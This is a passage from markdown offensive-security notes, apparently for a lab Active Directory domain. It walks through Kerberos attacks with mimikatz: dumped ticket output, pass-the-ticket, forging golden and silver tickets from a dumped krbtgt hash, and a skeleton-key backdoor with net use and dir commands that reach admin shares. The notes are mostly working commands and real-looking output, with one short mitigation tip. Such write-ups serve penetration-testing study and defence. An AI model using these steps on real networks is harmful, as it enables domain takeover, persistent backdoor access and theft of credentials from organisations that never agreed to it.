 27 77 7a b0 b2 22 c8 de 48 64 fd 21 2e da df 68 cc e0 3a 04 67 8a 11 a2 f8 f4 b0 b0 d1 e3 51 04 f1 fe da c9 f6 85 eb f4 25 a3 52 2a 00 e8 25 d3 9a 08 31 27 
86 cd b3 fe 6e 40 f6 ed 59 03 fe b1 3a 98 bf f7 d5 6c 74 3e de 5d fb 15 f4 08 c9 2b fd 0f c7 e7 6a 79 38 2c 93 4b

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 32810 (00000000:0000802a)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 6/30/2021 7:37:14 AM
SID               : S-1-5-96-0-1

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : fe 09 4c 08 0b cb e9 93 22 f0 ac d0 03 6d 7a be dd 10 c4 32 a0 f9 14 72 e7 25 44 a7 23 39 a4 68 3b 82 9e 60 ef d4 d3 5a 8a 21 90 fe 71 
14 bb 16 cf 47 f1 d7 9b 3d e5 e3 da cf 67 7e 9b 36 32 75 87 57 1b fc 8e e9 4e f6 30 3d 88 24 6e 4f 15 b9 f8 26 d3 d0 83 c0 67 1c b4 59 2e d6 bd 13 07 60 5e 0
7 e7 ea 6e cd 77 da 97 f6 69 ea 4c 6e 75 e7 25 04 a5 d2 1d 6e 8b d2 90 4e a1 1d 63 1d 02 22 42 a9 07 0b 1b bb f1 dc 6e 14 ed ab fa e4 3b 90 41 0b 87 bb a2 4d
 27 77 7a b0 b2 22 c8 de 48 64 fd 21 2e da df 68 cc e0 3a 04 67 8a 11 a2 f8 f4 b0 b0 d1 e3 51 04 f1 fe da c9 f6 85 eb f4 25 a3 52 2a 00 e8 25 d3 9a 08 31 27 
86 cd b3 fe 6e 40 f6 ed 59 03 fe b1 3a 98 bf f7 d5 6c 74 3e de 5d fb 15 f4 08 c9 2b fd 0f c7 e7 6a 79 38 2c 93 4b

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 6/30/2021 7:37:05 AM
SID               : S-1-5-18

         * Username : controller-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 6/30/2021 7:38:21 AM ; 6/30/2021 5:37:54 PM ; 7/7/2021 7:37:54 AM
           Service Name (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Target Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             785fec18d91b14a30b2e4477fef5a76278499cdc4dd91ff116e3518329eba642
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-0-0-40a50000.kirbi !
         [00000001]
           Start/End/MaxRenew: 6/30/2021 7:38:21 AM ; 6/30/2021 5:37:54 PM ; 7/7/2021 7:37:54 AM
           Service Name (02) : cifs ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (02) : cifs ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( CONTROLLER.local )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             d4c47e02f6a005ccc34bfe4a7688780932e5e86bf1ac6281c2e1db9bfe135c02
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-0-1-40a50000-CONTROLLER-1$@cifs-CONTROLLER-1.CONTROLLER.local.kirbi ! 
         [00000002]
           Start/End/MaxRenew: 6/30/2021 7:38:21 AM ; 6/30/2021 5:37:54 PM ; 7/7/2021 7:37:54 AM
           Service Name (02) : cifs ; CONTROLLER-1 ; @ CONTROLLER.LOCAL
           Target Name  (02) : cifs ; CONTROLLER-1 ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             aa200ddb36cf289c8b2caba4b5df13c71ad832fa086970458cb60372ec8d1894
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-0-2-40a50000-CONTROLLER-1$@cifs-CONTROLLER-1.kirbi !
         [00000003]
           Start/End/MaxRenew: 6/30/2021 7:38:01 AM ; 6/30/2021 5:37:54 PM ; 7/7/2021 7:37:54 AM
           Service Name (02) : LDAP ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (02) : LDAP ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( CONTROLLER.LOCAL )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             28ca5925e323f8a7ae22e9d5e2ddd35d98d7cd2ebe375eb7ae57ab600a04af4e
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-0-3-40a50000-CONTROLLER-1$@LDAP-CONTROLLER-1.CONTROLLER.local.kirbi !
         [00000004]
           Start/End/MaxRenew: 6/30/2021 7:37:54 AM ; 6/30/2021 5:37:54 PM ; 7/7/2021 7:37:54 AM
           Service Name (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             3633ce9240778c13c1d08aa6d1c26f2451b60b57544942a2cfd259b53d123aa7
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-0-4-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi !
         [00000005]
           Start/End/MaxRenew: 6/30/2021 7:37:54 AM ; 6/30/2021 5:37:54 PM ; 7/7/2021 7:37:54 AM
           Service Name (02) : LDAP ; CONTROLLER-1 ; @ CONTROLLER.LOCAL
           Target Name  (02) : LDAP ; CONTROLLER-1 ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             1f81eba6a7560d67ba65fc02acf036f0c40b88b6d1109b3e588d0062fc717a39
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-0-5-40a50000-CONTROLLER-1$@LDAP-CONTROLLER-1.kirbi !

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 6/30/2021 7:38:23 AM ; 6/30/2021 7:53:23 AM ; 7/7/2021 7:37:54 AM
           Service Name (01) : controller-1$ ; @ (null)
           Target Name  (10) : administrator@CONTROLLER.local ; @ (null)
           Client Name  (10) : administrator@CONTROLLER.local ; @ CONTROLLER.LOCAL
           Flags 00a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ;
           Session Key       : 0x00000012 - aes256_hmac
             3dc11900086fc9c92d11497b5a97f5e2d203eef1d89da5cdb242cfb932756fe4
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-1-0-00a50000.kirbi !

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 6/30/2021 7:37:54 AM ; 6/30/2021 5:37:54 PM ; 7/7/2021 7:37:54 AM
           Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( $$Delegation Ticket$$ )
           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             d6e53445cc44228522982ea8518e399d9cff107beae6615c2a796738f47914e0
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;3e7]-2-0-60a10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi !
         [00000001]
           Start/End/MaxRenew: 6/30/2021 7:37:54 AM ; 6/30/2021 5:37:54 PM ; 7/7/2021 7:37:54 AM
           Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Target Name  (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( CONTROLLER.LOCAL )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             c3d3a58cb51acc4d5ef4f9e4cf3df3653799614e56d77c6238e9f115a26cb584
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;3e7]-2-1-40e10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi !
```

- Impersonate a given ticket:

```
mimikatz # kerberos::ptt [0;3e7]-1-0-00a50000.kirbi

* File: '[0;3e7]-1-0-00a50000.kirbi': OK 
```

- Verify with `klist` that we successfully impersonated the ticket by listing our cached tickets.

### Mitigation

- Don't let your domain admins log onto anything except the domain controller - This is something so simple however a lot of domain admins still log onto low-level computers leaving tickets around that we can use to attack and move laterally with.

___

## Golden/Silver Ticket Attacks w/ `mimikatz` 

The key difference between the two tickets is that a **silver ticket** is limited to the service that is targeted whereas a **golden ticket** has access to any Kerberos service.

**KRBTGT** is the service account for the KDC that issues all of the tickets to the clients. If you impersonate this account and create a golden ticket, you will have the the ability to create a service ticket for anything you want.

A **silver ticket** can sometimes be better used in engagements rather than a **golden ticket** because it is a little more discreet. If stealth and staying undetected matter then a silver ticket is probably a better option than a golden ticket however the approach to creating one is the exact same. 


1. Dumping the hash and SID of the krbtgt service account

```cmd
mimikatz # lsadump::lsa /inject /name:krbtgt 
Domain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860 
                                                               
RID  : 000001f6 (502)                                          
User : krbtgt                                                  
                                                               
 * Primary                                                     
    NTLM : 72cd714611b64cd4d5550cd2759db3f6                    
    LM   :                                                     
  Hash NTLM: 72cd714611b64cd4d5550cd2759db3f6                  
    ntlm- 0: 72cd714611b64cd4d5550cd2759db3f6                  
    lm  - 0: aec7e106ddd23b3928f7b530f60df4b6 
                                              
 * WDigest                                    
    01  d2e9aa3caa4509c3f11521c70539e4ad      
    02  c9a868fc195308b03d72daa4a5a4ee47      
    03  171e066e448391c934d0681986f09ff4      
    04  d2e9aa3caa4509c3f11521c70539e4ad      
    05  c9a868fc195308b03d72daa4a5a4ee47      
    06  41903264777c4392345816b7ecbf0885      
    07  d2e9aa3caa4509c3f11521c70539e4ad      
    08  9a01474aa116953e6db452bb5cd7dc49      
    09  a8e9a6a41c9a6bf658094206b51a4ead      
    10  8720ff9de506f647ad30f6967b8fe61e 
    11  841061e45fdc428e3f10f69ec46a9c6d
    12  a8e9a6a41c9a6bf658094206b51a4ead
    13  89d0db1c4f5d63ef4bacca5369f79a55
    14  841061e45fdc428e3f10f69ec46a9c6d
    15  a02ffdef87fc2a3969554c3f5465042a
    16  4ce3ef8eb619a101919eee6cc0f22060
    17  a7c3387ac2f0d6c6a37ee34aecf8e47e
    18  085f371533fc3860fdbf0c44148ae730
    19  265525114c2c3581340ddb00e018683b
    20  f5708f35889eee51a5fa0fb4ef337a9b
    21  bffaf3c4eba18fd4c845965b64fca8e2 
    22  bffaf3c4eba18fd4c845965b64fca8e2
    23  3c10f0ae74f162c4b81bf2a463a344aa
    24  96141c5119871bfb2a29c7ea7f0facef
    25  f9e06fa832311bd00a07323980819074
    26  99d1dd6629056af22d1aea639398825b
    27  919f61b2c84eb1ff8d49ddc7871ab9e0
    28  d5c266414ac9496e0e66ddcac2cbcc3b
    29  aae5e850f950ef83a371abda478e05db

 * Kerberos
    Default Salt : CONTROLLER.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 79bf07137a8a6b8f

 * Kerberos-Newer-Keys
    Default Salt : CONTROLLER.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : dfb518984a8965ca7504d6d5fb1cbab56d444c58ddff6c193b64fe6b6acf1033
      aes128_hmac       (4096) : 88cc87377b02a885b84fe7050f336d9b
      des_cbc_md5       (4096) : 79bf07137a8a6b8f

 * NTLM-Strong-NTOWF
    Random Value : 4b9102d709aada4d56a27b6c3cd14223
```

2. Creating a golden ticket:

```cmd
mimikatz # kerberos::golden /user:Administrator /domain:CONTROLLER.LOCAL /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3
f6 /id:500
User      : Administrator 
Domain    : CONTROLLER.LOCAL (CONTROLLER)
SID       : S-1-5-21-432953485-3795405108-1502158860
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 72cd714611b64cd4d5550cd2759db3f6 - rc4_hmac_nt
Lifetime  : 6/30/2021 7:54:08 AM ; 6/28/2031 7:54:08 AM ; 6/28/2031 7:54:08 AM
-> Ticket : ticket.kirbi

 * PAC generated 
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !
```

> **Tips:** to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.

With the `mimikatz` commands `lsadump::lsa /inject /name:sqlservice` and `lsadump::lsa /inject /name:Administrator`, we can retrieve the following hashes: 

![](img/tickets.png)

___

## Kerberos Backdoors w/ `mimikatz` 

`mimikatz` has one other trick up its sleeves when it comes to maintaining access via Kerberos.

The Kerberos backdoor works by <u>**implanting a skeleton key** that abuses the way that the AS-REQ validates encrypted timestamps</u>. 

> **Warning**: A skeleton key only works using Kerberos RC4 encryption. 

> **Note**: The default hash for a mimikatz skeleton key is `60BA4FCADC466C7A033C178194C03DF6` which makes the password _"mimikatz"_

```cmd
mimikatz # misc::skeleton 
[KDC] data 
[KDC] struct           
[KDC] keys patch OK    
[RC4] functions        
[RC4] init patch OK    
[RC4] decrypt patch OK 
```

### Accessing the forest

The default credentials will be: _"mimikatz"_

- Examples: 
  + `net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz`
    * The share will now be accessible without the need for the Administrators password
  + `dir \\Desktop-1\c$ /user:Machine1 mimikatz`
    * Access the directory of Desktop-1 without ever knowing what users have access to Desktop-1

> **Note**: The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques.

___

## Useful links

- [Kerberos en Active Directory](https://beta.hackndo.com/kerberos/)
- [Abusing Microsoft Kerberos: Sorry You Guys Don't Get It](https://www.youtube.com/watch?v=lJQn06QLwEw)
- [kerbrute](https://github.com/ropnop/kerbrute/releases)
- [HarmJ0y blog](http://www.harmj0y.net/blog/)
- [Rubeus](https://github.com/GhostPack/Rubeus)
- [impacket](https://github.com/SecureAuthCorp/impacket)

- <https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a>
- <https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat>
- <https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1>
- <https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/>
- <https://www.varonis.com/blog/kerberos-authentication-explained/>
- <https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf>
- <https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493862736.pdf>
- <https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf>